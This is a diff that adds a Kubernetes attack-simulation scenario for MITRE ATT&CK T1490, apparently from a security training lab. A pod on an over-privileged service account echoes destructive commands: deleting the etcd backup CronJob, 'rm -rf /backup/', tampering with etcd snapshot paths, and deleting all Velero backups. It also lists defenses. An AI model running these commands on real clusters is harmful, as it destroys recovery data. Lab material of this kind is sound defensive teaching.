@@ -1,0 +1,66 @@
+# KOAD-S33: Inhibit System Recovery
+# ATT&CK: T1490 — Inhibit System Recovery
+# Attack: Delete backup CronJobs and tamper with etcd snapshot paths
+---
+apiVersion: batch/v1
+kind: CronJob
+metadata:
+  name: etcd-backup
+  namespace: koad
+  labels:
+    app: etcd-backup
+    koad-scenario: S33
+    mitre-attck: T1490
+spec:
+  schedule: "0 */6 * * *"
+  jobTemplate:
+    spec:
+      template:
+        metadata:
+          labels:
+            app: etcd-backup
+            koad-scenario: S33
+        spec:
+          restartPolicy: OnFailure
+          containers:
+            - name: backup
+              image: bitnami/etcd:3.5
+              command: ["sh", "-c"]
+              args:
+                - |
+                  echo "[Backup] Taking etcd snapshot..."
+                  echo "ETCDCTL_API=3 etcdctl snapshot save /backup/etcd-$(date +%Y%m%d).db"
+                  echo "Backup complete."
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: recovery-inhibitor
+  namespace: koad
+  labels:
+    koad-scenario: S33
+spec:
+  serviceAccountName: overprivileged-sa
+  containers:
+    - name: inhibitor
+      image: bitnami/kubectl:latest
+      command: ["sh", "-c"]
+      args:
+        - |
+          echo "=== KOAD-S33: Inhibit System Recovery ==="
+          echo ""
+          echo "Attack 1 — Delete backup CronJob:"
+          echo "  kubectl delete cronjob etcd-backup -n koad"
+          echo ""
+          echo "Attack 2 — Delete existing backups:"
+          echo "  kubectl exec etcd-pod -- rm -rf /backup/"
+          echo ""
+          echo "Attack 3 — Tamper with etcd snapshot path:"
+          echo "  # Modify etcd startup args to use invalid snapshot path"
+          echo "  kubectl edit pod etcd-minikube -n kube-system"
+          echo ""
+          echo "Attack 4 — Delete Velero backups (if exists):"
+          echo "  kubectl delete backups.velero.io --all -n velero"
+          echo ""
+          echo "Defense: Offsite backups, immutable storage, RBAC on backup namespace"
+          sleep infinity
